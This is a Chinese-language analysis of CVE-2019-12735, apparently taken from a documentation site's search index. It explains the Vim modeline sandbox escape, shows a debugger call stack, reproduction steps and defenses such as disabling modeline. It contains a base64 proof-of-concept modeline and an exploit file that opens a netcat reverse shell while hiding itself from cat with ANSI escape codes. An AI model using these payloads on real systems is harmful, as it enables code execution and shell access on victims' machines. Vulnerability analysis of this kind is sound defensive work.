groups=1000(invincible),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n\n\n```\n\n\nd.\u5229\u7528\u6838\u5fc3\u8981\u7d20\n\n\n\n\n\n\nVim\u7684modeline\u53ef\u4ee5\u5728\u6587\u4ef6\u52a0\u8f7d\u65f6\u81ea\u52a8\u914d\u7f6e\uff1b\n\n\n\n\n\n\nVim\u8fdb\u884c\u914d\u7f6e\u65f6\u4f1a\u6267\u884cVim\u6307\u4ee4\uff0c\u800cVim\u7684\u67d0\u4e9b\u6307\u4ee4\u53c8\u80fd\u591f\u6267\u884c\u7cfb\u7edf\u7684Shell\u6307\u4ee4(\u901a\u8fc7fork+execvp/system)\uff1b\n\n\n\n\n\n\nVim\u7684\u5bf9\u53ef\u6267\u884c\u6307\u4ee4\u7684\u6761\u4ef6\u5ba1\u67e5\u4e0d\u4e25\u683c\uff0c\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u3002\n\n\n\n\n\n\n5.\u9632\u62a4\u5efa\u8bae\n\n\n\u7ed3\u5408\u6f0f\u6d1e\u539f\u7406\u548c\u5229\u7528\u539f\u7406\uff0c\u4ece\u9632\u62a4\u4ea7\u54c1\u7814\u53d1\u7684\u89d2\u5ea6\uff0c\u63d0\u51fa\uff1a\n\n\n\n\n\u5982\u4f55\u68c0\u6d4b\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\npackage\u7248\u672c\u68c0\u67e5\uff1a\u83b7\u53d6\u5f53\u524d\u7cfb\u7edfvim\u7684package\u7248\u672c\u4fe1\u606f\uff0c\u5bf9\u6bd4package\u7684changelog\u5224\u65ad\u5f53\u524d\u7248\u672c\u662f\u5426\u4fee\u590d\u4e86\u6f0f\u6d1e(\u5982\u679c\u662f\u624b\u52a8\u7f16\u8bd1\u53ef\u80fd\u5b58\u5728\u65e0\u6cd5\u83b7\u53d6package\u4fe1\u606f\u7684\u60c5\u51b5)\u5177\u4f53\u64cd\u4f5c\u89c1\u9644\u4ef6-\u6f0f\u6d1e\u9632\u62a4->package\u7248\u672c\u68c0\u67e5\u90e8\u5206\n\n\npoc\u9a8c\u8bc1\uff1a\u624b\u52a8\u9a8c\u8bc1\uff0c\u4ee3\u7801\u6267\u884cvim\u8bfb\u53d6stdout\uff0c\u6216\u8005ptrace\u8bfb\u53d6\u8c03\u7528\u6808\u3002\u5177\u4f53\u89c1\u9644\u4ef6-\u6f0f\u6d1e\u9632\u62a4-> poc\u9a8c\u8bc1\u90e8\u5206\u3002\n\n\n\u5982\u4f55\u9632\u5fa1\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\n\u66f4\u65b0\u8f6f\u4ef6\uff0c\u8fd9\u662f\u6700\u7b80\u5355\u901a\u7528\u7684\u65b9\u6cd5\uff1b\n\n\n\u914d\u7f6e\u68c0\u67e5\uff0cDebian\u7b49\u4e00\u4e9b\u53d1\u884c\u7248\u5df2\u7ecf\u9ed8\u8ba4\u5173\u95ed\u4e86modeline\u7684\u914d\u7f6e\uff0c\u8fd9\u6837\u53ef\u4ee5\u5b8c\u5168\u9694\u65ad\u8be5\u6f0f\u6d1e\u7684\u5229\u7528\u8def\u5f84\uff0c\u5982\u679c\u9ed8\u8ba4\u6ca1\u6709\u5173\u95ed\uff0c\u5219\u9700\u8981\u624b\u52a8\u5173\u95ed\uff0c\u5177\u4f53\u914d\u7f6e\u65b9\u6cd5\u89c1\n\u9644\u4ef6\n-\u6f0f\u6d1e\u9632\u62a4-> \u914d\u7f6e\u68c0\u67e5\u90e8\u5206\uff1b\n\n\n\u6587\u4ef6\u76d1\u63a7\uff0c\u5339\u914d\u6587\u4ef6\u9996\u90e8\u6216\u8005\u5c3e\u90e8\u662f\u5426\u7b26\u5408modeline\u7279\u5f81\uff0c\u5982\u679c\u7b26\u5408\uff0c\u4e14modeline\u4e2d\u5305\u542b\"source\"\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u53d1\u51fa\u8b66\u62a5(\u975e\u901a\u7528\u65b9\u6cd5\uff0c\u5bf9\u7cfb\u7edf\u6027\u80fd\u6709\u635f\u8017)\u3002\n\n\n\u6709\u6ca1\u6709\u54ea\u79cd\u901a\u7528\u7684\u7f13\u89e3\u63aa\u65bd\u53ef\u4ee5\u963b\u65ad\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\n\u4ec5\u9488\u5bf9\u8be5\u6f0f\u6d1e\u7684\u901a\u7528\u7f13\u89e3\u63aa\u65bd\u5c31\u662f\u5173\u95edmodeline\u914d\u7f6e\uff1b\n\n\n\u8be5\u7c7b\u6f0f\u6d1e\u5c5e\u4e8eOS\u547d\u4ee4\u6ce8\u5165\uff0c\u4e00\u822c\u662f\u901a\u8fc7\u76d1\u63a7system/fork/exec\u7b49\u7cfb\u7edf\u51fd\u6570\u53ef\u4ee5\u53d1\u73b0\u548c\u963b\u65ad\u5a01\u80c1(\u4f46\u662f\u5bf9\u7cfb\u7edf\u6027\u80fd\u6709\u635f\u8017)\u3002\n\n\n\n\n6.\u53c2\u8003\n\n\nhttps://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.mdhttps://imbawenzi.github.io/2019/08/03/vim/",
            "title": "Cve 2019 12735"
        },
        {
            "location": "/cve-2019-12735/#cve-2019-12735",
            "text": "",
            "title": "cve-2019-12735"
        },
        {
            "location": "/cve-2019-12735/#0",
            "text": "invincible1944@gmail.com",
            "title": "0.\u4f5c\u8005"
        },
        {
            "location": "/cve-2019-12735/#1",
            "text": "\u6f0f\u6d1e\u76f8\u5173\u8f6f\u4ef6   Vim/NeoVim     Vim/NeoVim \u7b80\u4ecb    Vim\u662f\u4ecevi\u53d1\u5c55\u51fa\u6765\u7684\u4e00\u4e2a\u6587\u672c\u7f16\u8f91\u5668\uff0c\u662fLinux \u5e73\u53f0\u6700\u5e38\u7528\u7684\u7f16\u8f91\u5668\u4e4b\u4e00\u3002    Neovim \u662fVim\u7684\u4e00\u4e2a\u91cd\u6784\u7248\u672c\uff0c\u81f4\u529b\u4e8e\u6210\u4e3aVim\u7684\u8d85\u96c6\uff08superset\uff09\uff0c    Neovim\u7684\u7b2c\u4e00\u4e2a\u7248\u672c\u57282015\u5e7412\u6708\u53d1\u884c\uff0c\u5e76\u4e14\u80fd\u591f\u5b8c\u5168\u517c\u5bb9Vim\u7684\u7279\u6027\u3002     \u76f8\u6bd4\u4e8eVim\uff0cNeovim\u7684\u4e3b\u8981\u6539\u8fdb\u5728\u4e8e\u5176\u652f\u6301\u5f02\u6b65\u52a0\u8f7d\u63d2\u4ef6\u3002    \u6f0f\u6d1e\u5371\u5bb3    \u6253\u5f00\u6076\u610f\u6784\u9020\u7684\u6587\u672c\u6587\u4ef6\uff0c\u53ef\u4ee5\u89e6\u53d1\u547d\u4ee4\u6267\u884c\uff0c\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u4e0e\u5f53\u524d\u7528\u6237\u540c\u6837\u7684\u6743\u9650\u3002   \u76f8\u5173\u80cc\u666f\u77e5\u8bc6   \u89c1\u9644\u4ef6\uff1acve-2019-12735-01.md",
            "title": "1.\u80cc\u666f\u4ecb\u7ecd"
        },
        {
            "location": "/cve-2019-12735/#2",
            "text": "\u6f0f\u6d1e\u539f\u7406\u7cbe\u51c6\u6982\u62ec   Vim \u7684sandbox\u5bf9\u8f93\u5165\u7684\u547d\u4ee4\u5ba1\u67e5\u4e0d\u4e25\u683c\uff0c\u5bfc\u81f4\u53ef\u4ee5\u901a\u8fc7vim\u7684source\u547d\u4ee4\u52a0\u8f7d\u5176\u4ed6Vim\u811a\u672c\u7ed5\u8fc7\u6c99\u7bb1\u6267\u884c\uff0c\u914d\u5408\u4e0amodeline\u7279\u6027\uff0c\u53ef\u4ee5\u5728Vim\u6253\u5f00\u666e\u901a\u6587\u4ef6\u65f6\u5b9e\u73b0OS command injection.   \u6f0f\u6d1e\u6240\u5c5e\u8f6f\u4ef6\u94fe\u63a5\uff0c\u7248\u672c\uff0c\u6a21\u5757\uff0c\u76ee\u5f55\uff0c\u6587\u4ef6\uff0c\u4ee3\u7801\u884c   \u6f0f\u6d1e\u8f6f\u4ef6\u7248\u672c\uff1aVim <= 8.1.1365/ NeoVim  <= 0.3.6  \u6f0f\u6d1e\u4ee3\u7801\u4f4d\u7f6e\uff1aVim 81/src/getchar.c -> openscript  Vim\u5b98\u7f51  Vim\u6e90\u7801\u5e93   \u6f0f\u6d1e\u6240\u5c5e\u7c7b\u578b   CWE-78 OS Command Injection   \u6f0f\u6d1e\u8865\u4e01   Vim patch   \u6f0f\u6d1eCVE\u53f7   CVE-2019-12735",
            "title": "2.\u6f0f\u6d1e\u5206\u6790"
        },
        {
            "location": "/cve-2019-12735/#3poc",
            "text": "",
            "title": "3.POC"
        },
        {
            "location": "/cve-2019-12735/#apoc",
            "text": "\u80cc\u666f\u7b80\u4ecb    Vim\u53ef\u4ee5\u901a\u8fc7Vim\u811a\u672c\u7f16\u5199\u63d2\u4ef6\uff0c\u901a\u8fc7source[!]\u547d\u4ee4\u52a0\u8f7d\u548c\u6267\u884c\u811a\u672c   Vim\u652f\u6301\u901a\u8fc7Vim command\u6216\u8005Vim\u811a\u672c\u6267\u884cshell\u6307\u4ee4  vim\u652f\u6301\u901a\u8fc7\u8868\u8fbe\u5f0f(\u53ef\u4ee5\u7406\u89e3\u4e3a\u77ed\u811a\u672c)\u5bf9\u6587\u672c\u8fdb\u884c\u8bbe\u7f6e(\u6bd4\u5982folding\u4ee3\u7801\u5757\u6298\u53e0\u663e\u793a\u529f\u80fd)  \u8868\u8fbe\u5f0f\u652f\u6301Vim\u6307\u4ee4\uff0c\u4f46\u662f\u4f1a\u5728\u81ea\u5df1\u7684sandbox\u6267\u884c\uff0c\u53ea\u8f93\u51fa\u6267\u884c\u7ed3\u679c  Vim\u8868\u8fbe\u5f0f\u4e2d\u5b58\u5728\u4e00\u4e9b\u81ea\u5e26\u7684\u51fd\u6570execute, assert_fails\u7b49\uff0c\u53ef\u4ee5\u5c06Vim command\u4f5c\u4e3a\u53c2\u6570\u6267\u884c\u3002  \u7531\u4e8e\u9650\u5236\u4e0d\u4e25\u683c\uff0c\u5f53\u8868\u8fbe\u5f0f\u901a\u8fc7execute, assert_fails\u8fd9\u7c7b\u51fd\u6570\u6267\u884csource\u547d\u4ee4\u65f6\uff0c\u4f1a\u5728sandbox\u4e2d\u6267\u884c\uff0c\u4f46\u662fsource \u52a0\u8f7d\u7684Vim\u811a\u672c\u5219\u4f1a\u5728\u6b63\u5e38\u8fdb\u7a0b\u73af\u5883\u4e2d\u6267\u884c   Vim\u7684modeline\u529f\u80fd\u662f\u7528\u4e8e\u5bf9\u5355\u4e2a\u6587\u4ef6\u8fdb\u884c\u81ea\u52a8\u914d\u7f6e\u7684\uff0c\u5e76\u4e14\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u5e26\u6709\u8868\u8fbe\u5f0f\u7684\u914d\u7f6e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5229\u7528\u6b64\u7279\u6027\u5728Vim\u6253\u5f00\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f\u6587\u672c\u65f6\u5b9e\u73b0OS command injection.    Poc\u539f\u7406    \u8981\u7406\u89e3Poc\u7684\u539f\u7406\uff0c\u9700\u8981\u6709\u4e00\u4e9bVim\u76f8\u5173\u7684\u80cc\u666f\u77e5\u8bc6\uff0c\u89c1\u9644\u4ef6: cve-2019-12735-01.md  \u4e0b\u9762\ud83d\udc47\u662fPoc\u7684\u6d41\u7a0b\uff1a    vim \u6253\u5f00poc\u6587\u4ef6\uff0c\u8bc6\u522b\u51fa\u6587\u4ef6\u9996\u90e8\u7684modeline    \u8df3\u8fc7\u5f00\u5934\u7684text\uff0c\u4ece\"vi:\"\u540e\u9762\u5f00\u59cb\u4f9d\u6b21\u52a0\u8f7d\u914d\u7f6e\u9009\u9879    \u52a0\u8f7d\u5230fde\u9009\u9879\u65f6\uff0c\u6267\u884c\u8868\u8fbe\u5f0f\u4e2d\u7684assert_fails\u51fd\u6570\uff0c\u8fdb\u800c\u6267\u884csource! %\u6307\u4ee4    source! % \u5c06\u5f53\u524d\u6587\u4ef6\u4f5c\u4e3aVim\u811a\u672c\u52a0\u8f7d\u5e76\u6267\u884c    Vim\u811a\u672c\u7684\u5185\u5bb9\u5c31\u662fPoc\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u6b21\u4e0e\u76f4\u63a5\u6253\u5f00\u4e0d\u540c\uff0c\u662f\u4f5c\u4e3a\u811a\u672c\u52a0\u8f7d\uff0c\u6240\u4ee5\u6587\u4ef6\u5185\u5bb9\u4e0d\u4f1a\u88ab\u8bc6\u522b\u4e3amodeline\uff0c\u800c\u662f\u8bc6\u522b\u4e3aVim\u811a\u672c\uff0c\u5177\u4f53\u542b\u4e49\u662f\u6267\u884cshell\u547d\u4ee4 uname -a || \"some text\" \uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u547d\u4ee4\u6267\u884c    \u8c03\u7528\u6808\u4fe1\u606f  ```shell",
            "title": "a.POC\u539f\u7406"
        },
        {
            "location": "/cve-2019-12735/#0-openscript",
            "text": "name=0x88fba8 \"/home/invincible/Desktop/test/vim_test/poc.txt\", \ndirectly=0x0) at getchar.c:1415",
            "title": "0  openscript ("
        },
        {
            "location": "/cve-2019-12735/#1-0x000000000046e06f-in-cmd_source",
            "text": "fname=0x88fba8 \"/home/invincible/Desktop/test/vim_test/poc.txt\", \neap=0x7fffffffc5c0) at ex_cmds2.c:3502",
            "title": "1  0x000000000046e06f in cmd_source ("
        },
        {
            "location": "/cve-2019-12735/#2-0x000000000046dfd8-in-ex_source-eap0x7fffffffc5c0-at-ex_cmds2c3484",
            "text": "...",
            "title": "2  0x000000000046dfd8 in ex_source (eap=0x7fffffffc5c0) at ex_cmds2.c:3484"
        },
        {
            "location": "/cve-2019-12735/#4-0x0000000000470d89-in-do_cmdline-cmdline0x87ea80-source",
            "text": "...",
            "title": "4  0x0000000000470d89 in do_cmdline (cmdline=0x87ea80 \"source! %\","
        },
        {
            "location": "/cve-2019-12735/#7-0x00000000004395ec-in-call_func",
            "text": "funcname=0x884d40 \"assert_fails(\\\"source! %\\\")\", len=0xc,  ...",
            "title": "7  0x00000000004395ec in call_func ("
        },
        {
            "location": "/cve-2019-12735/#9-0x00000000004337f8-in-eval7-arg0x7fffffffd680-rettv0x7fffffffd6c0",
            "text": "...",
            "title": "9  0x00000000004337f8 in eval7 (arg=0x7fffffffd680, rettv=0x7fffffffd6c0,"
        },
        {
            "location": "/cve-2019-12735/#16-0x000000000043189b-in-eval0-arg0x884d40-assert_failssource",
            "text": "",
            "title": "16 0x000000000043189b in eval0 (arg=0x884d40 \"assert_fails(\\\"source! %\\\")\","
        },
        {
            "location": "/cve-2019-12735/#17-0x000000000042cc06-in-eval_foldexpr",
            "text": "arg=0x884d40 \"assert_fails(\\\"source! %\\\")\", cp=0x7fffffffd70c)",
            "title": "17 0x000000000042cc06 in eval_foldexpr ("
        },
        {
            "location": "/cve-2019-12735/#18-0x00000000004a8403-in-foldlevelexpr-flp0x7fffffffd7b0-at-foldc3032",
            "text": "...",
            "title": "18 0x00000000004a8403 in foldlevelExpr (flp=0x7fffffffd7b0) at fold.c:3032"
        },
        {
            "location": "/cve-2019-12735/#26-0x000000000040e02f-in-chk_modeline-lnum0x1-flags0x0-at-bufferc5234",
            "text": "",
            "title": "26 0x000000000040e02f in chk_modeline (lnum=0x1, flags=0x0) at buffer.c:5234"
        },
        {
            "location": "/cve-2019-12735/#27-0x000000000040dba6-in-do_modelines-flags0x0-at-bufferc5115",
            "text": "...",
            "title": "27 0x000000000040dba6 in do_modelines (flags=0x0) at buffer.c:5115"
        },
        {
            "location": "/cve-2019-12735/#30-0x00000000005e8db0-in-main-argc0x2-argv0x7fffffffde98-at-mainc881",
            "text": "...  ```",
            "title": "30 0x00000000005e8db0 in main (argc=0x2, argv=0x7fffffffde98) at main.c:881"
        },
        {
            "location": "/cve-2019-12735/#bpoc",
            "text": "$ echo \"OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK\" | base64 --decode > poc.txt\n$ cat poc.txt \n:!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source\\!\\ \\%\"):fdl=0:fdt=\"\n$vim poc.txt",
            "title": "b.POC\u6e90\u7801"
        },
        {
            "location": "/cve-2019-12735/#c",
            "text": "\u73af\u5883\u642d\u5efa    \u73af\u5883\u6e05\u5355   \u7cfb\u7edf\u7248\u672c: Ubuntu-16.04.6 LTS (Xenial Xerus)  Vim\u7248\u672c: VIM - Vi IMproved 7.4   Vim package \u7248\u672c:  2:7.4.1689-3ubuntu1  \u955c\u50cf\u4e0b\u8f7d\u5730\u5740: https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/14.04.6/ubuntu-14.04.6-desktop-amd64.iso     \u642d\u5efa\u6b65\u9aa4   \u5b89\u88c5\u865a\u62df\u673a   ```shell\n  #  \u521b\u5efa\u865a\u62df\u673a\u786c\u76d8\n  $ qemu-img create -f qcow2 ubuntu16.04.6.img 10G  # \u5b89\u88c5\u865a\u62df\u673a\n  $ qemu-system-x86_64  -m 2048 -hda ubuntu16.04.6.img -cdrom ./ubuntu-16.04.6-desktop-amd64.iso  # \u542f\u52a8\u865a\u62df\u673a\n  $ qemu-system-x86_64 -m 2048  ubuntu16.04.6.img  ```   \u5b89\u88c5nc.traditional   \u5efa\u7acb\u4f1a\u8bdd\u7684\u65b9\u5f0f\u5f88\u591a\uff0c\u8fd9\u4e00\u6b65\u53ea\u662f\u4e3a\u4e86\u6f14\u793aexp\u9700\u8981\u3002  shell\n  sudo apt-get install netcat-traditional   \u5b89\u88c5\u542b\u6f0f\u6d1e\u7248\u672c\u7684Vim   shell\n  $ sudo apt-get install vim-runtime=2:7.4.1689-3ubuntu1\n  $ sudo apt-get install vim-common=2:7.4.1689-3ubuntu1\n  $ sudo apt-get install vim=2:7.4.1689-3ubuntu1   \u68c0\u67e5Vim\u914d\u7f6e\u662f\u5426\u5f00\u542fmodeline\uff0c\u82e5\u6ca1\u6709\u5219\u914d\u7f6eVim   ```shell\n  # \u68c0\u67e5modeline\u914d\u7f6e\n  vim\n  :verbose set modeline? set modelines?\n  # \u5982\u679c\u663e\u793anomodeline\u6216\u8005nomodelines\u8868\u793a\u6ca1\u6709\u914d\u7f6e  # \u914d\u7f6e\u65b9\u6cd5\uff1a\n  vim ~/.vimrc\n  i\n  set modeline\n  set modelines=5\n   \n  :wq  ```    \u7b2c\u4e00\u6b65 \u521b\u5efapoc\u6587\u4ef6    ```shell\n  echo \"G1s/OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK\" | base64 --decode > poc.txt  base64\u7f16\u7801\u660e\u6587\uff1a\n  :!uname -a||\" vi:fen:fdm=expr:fde=assert_fails(\"source!\\ \\%\"):fdl=0:fdt=\"\\n  ```   \u7b2c\u4e8c\u6b65 \u7528vim\u6253\u5f00\u89e6\u53d1\u547d\u4ee4\u6267\u884c (uname -a)   ```shell\n  $ vim poc.txt   Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux  Press ENTER or type command to continue  ```",
            "title": "c.\u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/cve-2019-12735/#4exp",
            "text": "",
            "title": "4.EXP"
        },
        {
            "location": "/cve-2019-12735/#aexp",
            "text": "Exp\u662f\u4e00\u6761\u7cbe\u5fc3\u6784\u9020\u7684modeline\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u628a\u6076\u610f\u6587\u4ef6\u4f2a\u9020\u6210\u6b63\u5e38\u6587\u672c\uff0c\u6d88\u9664\u75d5\u8ff9\uff1b     \u53ef\u4ee5\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u7528\u4e8e\u6b3a\u9a97Vim\uff0c\u5b9e\u73b0\u4ee3\u7801\u6267\u884c\uff0c\u9690\u85cf\u6076\u610f\u6587\u672c\u5185\u5bb9\uff1b    \u53e6\u4e00\u90e8\u5206\u7528\u4e8e\u6b3a\u9a97cat\uff0c\u4f7f\u6587\u672c\u6253\u5f00\u65f6\u770b\u8d77\u6765\u662f\u6b63\u5e38\u6587\u672c\uff1b    \u4e3b\u8981\u901a\u8fc7ANSI Escape Code\u6765\u5b9e\u73b0\u8fd9\u4e9b\u9690\u85cf\u529f\u80fd\u3002    Vim\u52a0\u8f7dexp\u6587\u4ef6\u540e\u7b49\u540c\u4e8e\u6267\u884c\u4e0b\u9762\u7684\u5e8f\u5217\uff1a    ```shell\n  # modeline\u89e6\u53d1\u6267\u884c\u81ea\u52a8\u914d\u7f6e\n  :set fen\n  :set fdm=expr\n  :set fde=assert_fails('set\\ fde=x\\ |\\ source!\\ \\%')\n  :set fdl=0  # fde=assert_fails\u89e6\u53d1\u4e86assert_fails\u51fd\u6570\u8c03\u7528\n  :call assert_fails(\\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\\')  # assert_fails\u51fd\u6570\u6267\u884cvim\u547d\u4ee4\n  :set fde=x | source! %  # source! % \u52a0\u8f7d\u5f53\u524d\u6587\u4ef6\uff0c\u5e76\u89c6\u4e3aVim Ex mode\u4e0b\u7684\u811a\u672c\u6267\u884c\uff1a\n   \n  S\n  Nothing here.\n   \n  :silent! w\n  :call system('nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &') \n  :redraw! \n  :file \n  :silent! # \" vim: set fen fdm=expr fde=assert_fails(\\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\\') fdl=0: \\x16\\x1b[1G\\x16\\x1b[KNothing here.\"\\x16\\x1b[D \\n  # \u8bfb\u53d6\u5230\u6362\u884c\u7b26\u53f7\u540e\\n\u6267\u884c\u4e0a\u9762\u7b2c\u4e00\u4e2asilent!\u4ee5\u53ca\u540e\u9762\u7684\u547d\u4ee4\n  # \u901a\u8fc7vim\u7684system\u51fd\u6570\u6267\u884c\u4e86\u7cfb\u7edf\u547d\u4ee4,\u5efa\u7acb\u53cd\u5f39shell  ```   \u9010\u6761\u89e3\u91ca   ```shell\n  # exp.txt: \n  \\x1b[?7l\\x1bSNothing here.\\x1b:silent! w | call system(\\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\\') | redraw! | file | silent! # \" vim: set fen fdm=expr fde=assert_fails(\\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\\') fdl=0: \\x16\\x1b[1G\\x16\\x1b[2KNothing here.\"\\x16\\x1b[2D  \\n  # \u4e0b\u6587\u62ec\u53f7\u4e2d\u7684c\u8868\u793a\u7528\u4e8e\u6b3a\u9a97cat\uff0cv\u8868\u793aVim\u811a\u672c\u6b63\u5e38\u6307\u4ee4  \\x1b[?7l (c)\n  # \u5173\u95ed\u81ea\u52a8\u6362\u884c\n  # \u914d\u5408\\x1b[1G\u548c\\x1b[K\u4f7f\u7528\uff0c\u89c1\u4e0b\u6587\n  # \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 ANSI escape codes \u90e8\u5206  \\x1bS (v)\n  #  S \u76f8\u5f53\u4e8e\u4f9d\u6b21\u6309\u4e0bESC\u952e\u548cS\u952e\n  # \u8868\u793a\u526a\u5207\u5f53\u524d\u884c\uff0c\u5e76\u4eceNormal mode\u5207\u6362\u5230Insert mode\n  # \u7ecf\u6d4b\u8bd5\uff0c\u8fd9\u91cc\u7684\\x1b\u662f\u53ef\u4ee5\u53bb\u6389\u7684\n  # \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 ANSI escape codes \u90e8\u5206  Nothing here. (v)\n  # \u5728Insert mode\u4e0b\u5199\u5165\u5b57\u7b26\u4e32 Nothing here.  \\x1b (v)\n  # \u76f8\u5f53\u4e8e\u4f9d\u6b21\u6309\u4e0bESC\u952e\uff0c\u9000\u51faInsert mode \u8fd4\u56deNormal mode  :  (v)\n  # \u4eceNormal mode\u8fdb\u5165Command-line mode  silent! w (v)\n  # \u4fdd\u5b58\u5199\u5165\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u5173\u95ed\u56de\u663e\n  # \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\u90e8\u5206  | call system(\\'nohup nc.traditional 127.0.0.1 9999 -e /bin/sh &\\') (v)\n  # \u8c03\u7528system \u51fd\u6570\u6267\u884cShell\u547d\u4ee4\n  # \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\u90e8\u5206  | redraw! (v)\n  # \u6e05\u9664\u56de\u663e\u4fe1\u606f\n  # \u5177\u4f53\u5b9a\u4e49\u548c\u6d4b\u8bd5Demo\u89c1\u9644\u4ef6 Vim\u8868\u8fbe\u5f0f\u548c\u811a\u672c\u90e8\u5206  | file | silent! [some text] (v)\n  # \u663e\u793a\u5f53\u524d\u6587\u4ef6\u4fe1\u606f\uff0csilent!\u7528\u4e8e\u6e05\u9664\u540e\u9762\u7684\u5b57\u7b26\u4e32\u4ea7\u751f\u7684\u62a5\u9519\u4fe1\u606f\n  # \u6700\u540e\u7684\u6548\u679c\u5c31\u662f\u5c4f\u5e55\u5e95\u90e8\u663e\u793a\u7684\u662ffile\u7684\u6267\u884c\u7ed3\u679c  vim: set fen fdm=expr fde=assert_fails(\\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\\') fdl=0: (v)\n  # vim\u52a0\u8f7d\u65f6modeline\u7684\u6b63\u6587\u90e8\u5206\n  # fen foldenable, \u5f00\u542f\u4ee3\u7801\u6298\u53e0folding\u529f\u80fd\n  # fdm foldmethod, \u8bbe\u7f6efolding\u65b9\u6cd5\u4e3aexpr\n  # fde foldexpr, \u8bbe\u7f6efold expression\n  # assert_fails Vim\u7684\u5185\u90e8\u51fd\u6570\uff0c\u53ef\u4ee5\u6267\u884c\u7b2c\u4e00\u4e2a\u53c2\u6570\u6307\u5b9a\u7684vim\u547d\u4ee4\uff0c\u5177\u4f53\u89c1\u9644\u4ef6\n  # \u6b64\u5904\u6267\u884c\u4e86\u4e24\u4e2a\u547d\u4ee4\uff1a\n  # set fde \u628afoldexpr\u8bbe\u7f6e\u4e3ax(\u76f8\u5f53\u4e8e\u8bbe\u7f6e\u4e3a\u65e0\u6548)\n  # source % \u628a\u5f53\u524d\u6587\u4ef6\u89c6\u4e3avim\u811a\u672c\uff0c\u52a0\u8f7d\u5e76\u6267\u884c\n  # fdl foldlevel \u8bbe\u7f6e\u4e3a0\u8868\u793a\u6240\u6709\u6ee1\u8db3\u6761\u4ef6\u7684\u6587\u672c\u5757\u90fd\u6298\u53e0\u663e\u793a(\u4e0eexp\u65e0\u5173)  \\x16 (v) \n  # \u8fd9\u4e2a\u5f88\u5173\u952e\uff0c\u7531\u4e8e\u662f\u7528source! %\u6253\u5f00\uff0c\u6240\u4ee5\u6587\u672c\u7684\u5185\u5bb9\u90fd\u4f1a\u8bc6\u522b\u6210\u5728Normal mode\u4e0b\u7684\u8f93\u5165\uff0c\u6bd4\u5982\\x1b\u5c31\u662f\u6309\u4e0b , S\u5c31\u4ee3\u8868\u6309\u4e0b\u952e\u76d8(shift+s)\uff0c\u800c\u5f53\u6267\u884c\u5230\u7b2c\u4e8c\u4e2asilent! \u4e4b\u540e\uff0c\u540e\u9762\u7684\u5b57\u7b26\u4e32\u76f4\u5230'\\n'\u6211\u4eec\u5e0c\u671b\u5b83\u4eec\u88ab\u5ffd\u7565\uff0c\u4f46\u662f\u4e3a\u4e86\u6784\u9020cat\u7684\u8f93\u51fa, \u5b57\u7b26\u4e32\u4e2d\u5305\u542b\u4e86\u5f88\u591aescape code\u6bd4\u5982\\x1b[D, \u4f46\u662f\u8fd9\u4e9b\u4e5f\u4f1a\u88ab\u8bc6\u522b\u6210\u952e\u76d8\u7684\u6309\u952e\u64cd\u4f5c\uff0c\u5bfc\u81f4\u6574\u4e2a\u6307\u4ee4\u90fd\u65e0\u6cd5\u6267\u884c \u800c\\x16\u6b63\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u5b83\u4f1a\u628a\u4e0b\u4e00\u4e2a\u6309\u952e\u89e3\u6790\u6210\u5b57\u7b26\u800c\u4e0d\u4f1a\u8ba9\u5b83\u6267\u884c\u6309\u952e\u529f\u80fd\uff0c\u5177\u4f53\u5206\u6790\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002  \\x1b[1G (c)\n  # cat\u6253\u5f00\u65f6\u5019\uff0c\u5c06\u5149\u6807\u79fb\u52a8\u5230\u5f53\u524d\u884c\u7684\u9996\u90e8\n  # \u914d\u5408\\x1b[K\u548c\\x1b[?7l\uff0c\u89c1\u4e0b\u6587\n  # \u5177\u4f53\u5206\u6790\u548cDemo\u89c1\u9644\u4ef6 ANSI escape codes\u90e8\u5206\u3002  \\x16 (v)\n  # \u4f5c\u7528\u540c\u4e0a  \\x1b[2K (c)\n  # 